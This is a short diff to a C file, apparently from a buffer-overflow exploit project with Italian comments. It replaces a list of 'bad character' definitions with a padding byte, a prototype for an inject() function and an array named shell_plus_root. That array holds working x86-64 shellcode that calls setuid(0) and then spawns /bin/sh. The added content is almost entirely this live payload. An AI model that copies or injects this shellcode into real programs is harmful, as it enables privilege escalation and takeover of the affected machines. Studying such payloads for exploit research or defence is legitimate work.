@@ -1,11 +1,12 @@
 // Definizione dei caratteri con interpretazione speciale a livello assembly
 // che devono essere evitati ottenuti in modo sperimentale 
+#define padding 'A'
+const char shell_plus_root[] =
+        "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
+        "\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
+        "\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
+        "\x58\x0f\x05";
 
-#define BADS 
-
-#define NULL_BYTE 0x00
-#define LINE_FEED 0x0A
-#define CARRIAGE_RETURN 0x0D
-#define FORM_FEED 0xFF
 
 
+char* inject(int magic_number, char *to_inject);
